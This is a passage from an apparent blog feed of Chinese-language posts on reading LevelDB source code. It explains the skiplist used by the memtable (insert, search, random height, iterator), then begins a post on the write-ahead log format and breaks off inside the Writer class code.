    <content type="html"><![CDATA[<p>在leveldb中，memtable的实现是采用skiplist的，所以本篇文章，我们就来分析以下leveldb的skiplist。</p><p>对于不了解skiplist，建议先学习以下skiplist的基本概念，最好能跟着实现一个skiplist。</p><a id="more"></a><h2 id="1-skiplist的定义"><a href="#1-skiplist的定义" class="headerlink" title="1. skiplist的定义"></a>1. skiplist的定义</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Key, <span class="class"><span class="keyword">class</span> <span class="title">Comparator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">SkipList</span> &#123;</span></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">Node</span>;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// Create a new SkipList object that will use "cmp" for comparing keys,</span></span><br><span class="line">  <span class="comment">// and will allocate memory using "*arena".  Objects allocated in the arena</span></span><br><span class="line">  <span class="comment">// must remain allocated for the lifetime of the skiplist object.</span></span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">SkipList</span><span class="params">(Comparator cmp, Arena* arena)</span></span>;</span><br><span class="line"></span><br><span class="line">  SkipList(<span class="keyword">const</span> SkipList&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">  SkipList&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> SkipList&amp;) = <span class="keyword">delete</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Insert key into the list.</span></span><br><span class="line">  <span class="comment">// REQUIRES: nothing that compares equal to key is currently in the list.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Insert</span><span class="params">(<span class="keyword">const</span> Key&amp; key)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Returns true iff an entry that compares equal to key is in the list.</span></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">Contains</span><span class="params">(<span class="keyword">const</span> Key&amp; key)</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Iteration over the contents of a skip list</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Iterator</span> &#123;</span></span><br><span class="line">     ...</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">enum</span> &#123; kMaxHeight = <span class="number">12</span> &#125;;</span><br><span class="line"></span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Immutable after construction</span></span><br><span class="line">  Comparator <span class="keyword">const</span> compare_;</span><br><span class="line">  Arena* <span class="keyword">const</span> arena_;  <span class="comment">// Arena used for allocations of nodes</span></span><br><span class="line"></span><br><span class="line">  Node* <span class="keyword">const</span> head_;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Modified only by Insert().  Read racily by readers, but stale</span></span><br><span class="line">  <span class="comment">// values are ok.</span></span><br><span class="line">  <span class="built_in">std</span>::atomic&lt;<span class="keyword">int</span>&gt; max_height_;  <span class="comment">// Height of the entire list</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Read/written only by Insert().</span></span><br><span class="line">  Random rnd_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>总体来看，这个skiplist只提供了, <code>Insert</code>和<code>Contains</code>两个接口。一个用于插入key，一个用于判断skiplist中是否存在具有和传入key相同的key的entry。为什么不提供delete接口？因为在leveldb中，一个删除操作就是一个插入一个具有“删除标记”的节点。所以删除即插入。</p><h2 id="2-Insert"><a href="#2-Insert" class="headerlink" title="2. Insert"></a>2. Insert</h2><p>insert插入一个节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Key, <span class="class"><span class="keyword">class</span> <span class="title">Comparator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">SkipList</span>&lt;Key, Comparator&gt;:</span>:Insert(<span class="keyword">const</span> Key&amp; key) &#123;</span><br><span class="line">  <span class="comment">// TODO(opt): We can use a barrier-free variant of FindGreaterOrEqual()</span></span><br><span class="line">  <span class="comment">// here since Insert() is externally synchronized.</span></span><br><span class="line">   <span class="comment">// prev存放搜索路径</span></span><br><span class="line">  Node* prev[kMaxHeight];</span><br><span class="line">    <span class="comment">// 设置搜索路径</span></span><br><span class="line">  Node* x = FindGreaterOrEqual(key, prev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不允许出现相同节点</span></span><br><span class="line">  <span class="comment">// Our data structure does not allow duplicate insertion</span></span><br><span class="line">  assert(x == <span class="literal">nullptr</span> || !Equal(key, x-&gt;key));</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 采用随机height确定新节点能插入的最高高度</span></span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">height</span> = RandomHeight();</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">height</span> &gt; GetMaxHeight()) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = GetMaxHeight(); i &lt; <span class="built_in">height</span>; i++) &#123;</span><br><span class="line">      prev[i] = head_;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">// 更新最高高度</span></span><br><span class="line">    <span class="comment">// It is ok to mutate max_height_ without any synchronization</span></span><br><span class="line">    <span class="comment">// with concurrent readers.  A concurrent reader that observes</span></span><br><span class="line">    <span class="comment">// the new value of max_height_ will see either the old value of</span></span><br><span class="line">    <span class="comment">// new level pointers from head_ (nullptr), or a new value set in</span></span><br><span class="line">    <span class="comment">// the loop below.  In the former case the reader will</span></span><br><span class="line">    <span class="comment">// immediately drop to the next level since nullptr sorts after all</span></span><br><span class="line">    <span class="comment">// keys.  In the latter case the reader will use the new node.</span></span><br><span class="line">    max_height_.store(<span class="built_in">height</span>, <span class="built_in">std</span>::memory_order_relaxed);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入新节点</span></span><br><span class="line">  x = NewNode(key, <span class="built_in">height</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">height</span>; i++) &#123;</span><br><span class="line">    <span class="comment">// NoBarrier_SetNext() suffices since we will add a barrier when</span></span><br><span class="line">    <span class="comment">// we publish a pointer to "x" in prev[i].</span></span><br><span class="line">    x-&gt;NoBarrier_SetNext(i, prev[i]-&gt;NoBarrier_Next(i));</span><br><span class="line">    prev[i]-&gt;SetNext(i, x);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>插入节点逻辑很清晰, 主要就是三个工作：</p><ol><li>通过<code>FindGreaterOrEqual</code>函数确定搜索路径, 保存在 <code>prev</code>中</li><li>生成本次插入节点的高度</li><li>插入新节点</li></ol><h3 id="1-FindGreaterOrEqual"><a href="#1-FindGreaterOrEqual" class="headerlink" title="1. FindGreaterOrEqual"></a>1. FindGreaterOrEqual</h3><p>说一下<code>FindGreaterOrEqual</code>函数的作用：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Key, <span class="class"><span class="keyword">class</span> <span class="title">Comparator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">typename</span> <span class="title">SkipList</span>&lt;Key, Comparator&gt;:</span>:Node*</span><br><span class="line">SkipList&lt;Key, Comparator&gt;::FindGreaterOrEqual(<span class="keyword">const</span> Key&amp; key,</span><br><span class="line">                                              Node** prev) <span class="keyword">const</span> &#123;</span><br><span class="line">  Node* x = head_;</span><br><span class="line">  <span class="keyword">int</span> level = GetMaxHeight() - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    Node* next = x-&gt;Next(level);</span><br><span class="line">    <span class="keyword">if</span> (KeyIsAfterNode(key, next)) &#123;</span><br><span class="line">      <span class="comment">// Keep searching in this list</span></span><br><span class="line">      x = next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">if</span> (prev != <span class="literal">nullptr</span>) prev[level] = x;<span class="comment">// 保存路径到prev中</span></span><br><span class="line">      <span class="keyword">if</span> (level == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> next;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Switch to next list</span></span><br><span class="line">        level--;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>举个例子：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200909215139172.png" alt=""></p><p>现在一共有4层，level0,1,2,3. 最下面为level0. , 则prev数组的有效长度为4(实际上都为kmaxHeight),假设要插入87, 图中红色虚线为要插入时所经过的路线，prev数组的作用就是保存这些路线。 比如 prev[0] 代表的是level0层的86， prev[1]代表的是level1层的71,以此类推。</p><h3 id="2-RandomHeight"><a href="#2-RandomHeight" class="headerlink" title="2.RandomHeight"></a>2.RandomHeight</h3><p>紧接上面的例子，现在找到了要插入的地点（86的后一个节点），思考一个问题， skiplist的上层节点是怎么生成的？如果只在level0中插入87，那如何生成上层的87？ 这部分就是通过RandomHeight来实现的，每次找到要插入的节点的位置时，就为这个节点生成一个高度，从0到这个高度都要插入这个节点，而高度是随机生成的，我们看看这个函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Key, <span class="class"><span class="keyword">class</span> <span class="title">Comparator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">int</span> <span class="title">SkipList</span>&lt;Key, Comparator&gt;:</span>:RandomHeight() &#123;</span><br><span class="line">  <span class="comment">// Increase height with probability 1 in kBranching</span></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> kBranching = <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">height</span> = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> (<span class="built_in">height</span> &lt; kMaxHeight &amp;&amp; ((rnd_.Next() % kBranching) == <span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="built_in">height</span>++;</span><br><span class="line">  &#125;</span><br><span class="line">  assert(<span class="built_in">height</span> &gt; <span class="number">0</span>);</span><br><span class="line">  assert(<span class="built_in">height</span> &lt;= kMaxHeight);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">height</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>rnd_是一个随机对象，leveldb作者自己实现的随机数生成器，这部分我们不管，从这段代码来看， height是随机递增且不能超过预设的最大高度。</p><h2 id="3-Contains"><a href="#3-Contains" class="headerlink" title="3. Contains"></a>3. Contains</h2><p>这个函数没什么好说的，在skiplist中找到节点，如果存在这个节点，且key相同，则返回。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Key, <span class="class"><span class="keyword">class</span> <span class="title">Comparator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span> <span class="title">SkipList</span>&lt;Key, Comparator&gt;:</span>:Contains(<span class="keyword">const</span> Key&amp; key) <span class="keyword">const</span> &#123;</span><br><span class="line">  Node* x = FindGreaterOrEqual(key, <span class="literal">nullptr</span>);</span><br><span class="line">  <span class="keyword">if</span> (x != <span class="literal">nullptr</span> &amp;&amp; Equal(key, x-&gt;key)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-Iterator"><a href="#4-Iterator" class="headerlink" title="4. Iterator"></a>4. Iterator</h2><p>前面说了skiplist的两个接口，但是skiplist还提供了一个重要的功能，那就是迭代器，迭代器是用来遍历skiplist的内部节点的。我们一起来分析以下：</p><h3 id="1-基本定义"><a href="#1-基本定义" class="headerlink" title="1. 基本定义"></a>1. 基本定义</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Iteration over the contents of a skip list</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Iterator</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// Initialize an iterator over the specified list.</span></span><br><span class="line">  <span class="comment">// The returned iterator is not valid.</span></span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">Iterator</span><span class="params">(<span class="keyword">const</span> SkipList* <span class="built_in">list</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Returns true iff the iterator is positioned at a valid node.</span></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">Valid</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Returns the key at the current position.</span></span><br><span class="line">  <span class="comment">// REQUIRES: Valid()</span></span><br><span class="line">  <span class="function"><span class="keyword">const</span> Key&amp; <span class="title">key</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Advances to the next position.</span></span><br><span class="line">  <span class="comment">// REQUIRES: Valid()</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Next</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Advances to the previous position.</span></span><br><span class="line">  <span class="comment">// REQUIRES: Valid()</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Prev</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Advance to the first entry with a key &gt;= target</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Seek</span><span class="params">(<span class="keyword">const</span> Key&amp; target)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Position at the first entry in list.</span></span><br><span class="line">  <span class="comment">// Final state of iterator is Valid() iff list is not empty.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">SeekToFirst</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Position at the last entry in list.</span></span><br><span class="line">  <span class="comment">// Final state of iterator is Valid() iff list is not empty.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">SeekToLast</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">const</span> SkipList* list_;</span><br><span class="line">  Node* node_;</span><br><span class="line">  <span class="comment">// Intentionally copyable</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，这个迭代器提供的接口和普通迭代器基本一样，<strong>但没有value</strong>，内部私有成员包含一个skiplist和一个node，毕竟是要遍历skiplist，所以这也很好理解。</p><h3 id="2-Seek"><a href="#2-Seek" class="headerlink" title="2.Seek"></a>2.Seek</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Key, <span class="class"><span class="keyword">class</span> <span class="title">Comparator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">inline</span> <span class="title">void</span> <span class="title">SkipList</span>&lt;Key, Comparator&gt;:</span>:Iterator::Seek(<span class="keyword">const</span> Key&amp; target) &#123;</span><br><span class="line">  node_ = list_-&gt;FindGreaterOrEqual(target, <span class="literal">nullptr</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>seek内部直接调用了skiplist的FindGreaterOrEqual函数，FindGreaterOrEqual除了保存搜索路径外，最终还会返回找到的节点，正好可以用来做seek，并将结果保存在node_</p><h3 id="3-Next"><a href="#3-Next" class="headerlink" title="3. Next"></a>3. Next</h3><p>Next函数很简单，移动到下一个节点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Key, <span class="class"><span class="keyword">class</span> <span class="title">Comparator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">inline</span> <span class="title">void</span> <span class="title">SkipList</span>&lt;Key, Comparator&gt;:</span>:Iterator::Next() &#123;</span><br><span class="line">  assert(Valid());</span><br><span class="line">  node_ = node_-&gt;Next(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-Prev"><a href="#4-Prev" class="headerlink" title="4. Prev"></a>4. Prev</h3><p>prev内部调用了FindLessThan，它和FindGreaterOrEqual类似。其实可以双链表优化，但是双链表会多占用一个prev指针，这里应该算是时间换空间吧。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Key, <span class="class"><span class="keyword">class</span> <span class="title">Comparator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">inline</span> <span class="title">void</span> <span class="title">SkipList</span>&lt;Key, Comparator&gt;:</span>:Iterator::Prev() &#123;</span><br><span class="line">  <span class="comment">// Instead of using explicit "prev" links, we just search for the</span></span><br><span class="line">  <span class="comment">// last node that falls before key.</span></span><br><span class="line">  assert(Valid());</span><br><span class="line">  node_ = list_-&gt;FindLessThan(node_-&gt;key);</span><br><span class="line">  <span class="keyword">if</span> (node_ == list_-&gt;head_) &#123;</span><br><span class="line">    node_ = <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h3 id="5-key"><a href="#5-key" class="headerlink" title="5. key"></a>5. key</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> Key, <span class="class"><span class="keyword">class</span> <span class="title">Comparator</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">inline</span> <span class="title">const</span> <span class="title">Key</span>&amp; <span class="title">SkipList</span>&lt;Key, Comparator&gt;:</span>:Iterator::key() <span class="keyword">const</span> &#123;</span><br><span class="line">  assert(Valid());</span><br><span class="line">  <span class="keyword">return</span> node_-&gt;key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里，我们就说完skiplist了，有了skiplist的基础，下文我们将介绍memtable。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在leveldb中，memtable的实现是采用skiplist的，所以本篇文章，我们就来分析以下leveldb的skiplist。&lt;/p&gt;
&lt;p&gt;对于不了解skiplist，建议先学习以下skiplist的基本概念，最好能跟着实现一个skiplist。&lt;/p&gt;
    
    </summary>
    
    
      <category term="leveldb" scheme="https://www.ravenxrz.ink/categories/leveldb/"/>
    
    
  </entry>
  
  <entry>
    <title>leveldb源码阅读记录-log文件</title>
    <link href="https://www.ravenxrz.ink/archives/8ea77a40.html"/>
    <id>https://www.ravenxrz.ink/archives/8ea77a40.html</id>
    <published>2020-10-12T03:02:12.000Z</published>
    <updated>2020-10-12T03:20:08.908Z</updated>
    
    <content type="html"><![CDATA[<p>log文件是用来保证写入的持久性的。当用户向系统发出write请求，首先就会将数据写入一份到log文件中，然后再写入到memtable，这是为了防止系统crash而出现数据loss。</p><a id="more"></a><h2 id="1-结构分析"><a href="#1-结构分析" class="headerlink" title="1. 结构分析"></a>1. 结构分析</h2><p>关于log的结构在levedb源码的 doc/log_format.md中有介绍。</p><p>leveldb在内存中的数据结构是memtable，显然memtable是无法保证数据的持久性，因为系统一旦掉电，数据就丢失了，所以leveldb使用了log file来保证数据的持久性。log file具有only append的特点，写入速度快。</p><p>我们曾在<a href="https://www.ravenxrz.ink/archives/1a545f48.html">整体架构</a>中提到过log的结构，这里再说一下：</p><p>leveldb存放的是key-value对，因为键值和value值的长度是可变的，因此，每一笔记录都必须有个<strong>length</strong>字段来表明当前记录的长度。 当然了，leveldb为了校验数据的一致性，同时会计算<strong>checksum</strong>，作为记录的一个字段.</p><p>还有另外一个字段，即<strong>type</strong>。注意，Log文件是分block存放的，每个block的大小为32KB，这就会存在一个问题，如某个key－value对过大，无法存放在单个block中，可能存放在多个不同的block中,因此引入了另一个字段RecordType, 用于标识当前物理快与逻辑块之间的关系。</p><p>RecordType字段主要有以下四种类型：FULL/FIRST/MIDDLE/LAST。</p><ul><li><p>如果 一个Record的size在一个block内，则type=FULL</p></li><li><p>否则Record将会跨越多个block，则可能出现上图中的情况，分别对应FIRST/MIDDLE/LAST</p></li></ul><p>下图展示的 log 文件由 3 个 Block 构成，所以从物理布局来讲，一个 log 文件就是由连续的 32K 大小 Block 构成的。</p><p><img data-src="https://img-blog.csdnimg.cn/20190314203727797.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3R1d2VucWkyMDEz,size_16,color_FFFFFF,t_70" alt="img"></p><p>一个Record的逻辑结构如下：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/log-record%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84.jpg" alt=""></p><h2 id="2-源码分析"><a href="#2-源码分析" class="headerlink" title="2. 源码分析"></a>2. 源码分析</h2><p>与log相关的代码文件存放在：</p><ul><li>db/log_format.h</li><li>db/log_reader.h</li><li>db/log_reader.cc</li><li>db/log_writer.h</li><li>db/log_writer.cc</li></ul><h3 id="1-leveldb-log命名空间"><a href="#1-leveldb-log命名空间" class="headerlink" title="1. leveldb::log命名空间"></a>1. leveldb::log命名空间</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> leveldb &#123;</span><br><span class="line"><span class="keyword">namespace</span> <span class="built_in">log</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> RecordType &#123;</span><br><span class="line">  <span class="comment">// Zero is reserved for preallocated files</span></span><br><span class="line">  kZeroType = <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line">  kFullType = <span class="number">1</span>,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// For fragments</span></span><br><span class="line">  kFirstType = <span class="number">2</span>,</span><br><span class="line">  kMiddleType = <span class="number">3</span>,</span><br><span class="line">  kLastType = <span class="number">4</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kMaxRecordType = kLastType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kBlockSize = <span class="number">32768</span>;<span class="comment">// 1个block 32kb</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Header is checksum (4 bytes), length (2 bytes), type (1 byte).</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> kHeaderSize = <span class="number">4</span> + <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;  <span class="comment">// namespace log</span></span><br><span class="line">&#125;  <span class="comment">// namespace leveldb</span></span><br></pre></td></tr></table></figure><h3 id="2-写操作"><a href="#2-写操作" class="headerlink" title="2. 写操作"></a>2. 写操作</h3><p>log wirter类，对log写入的封装：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> leveldb &#123;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WritableFile</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="built_in">log</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Writer</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  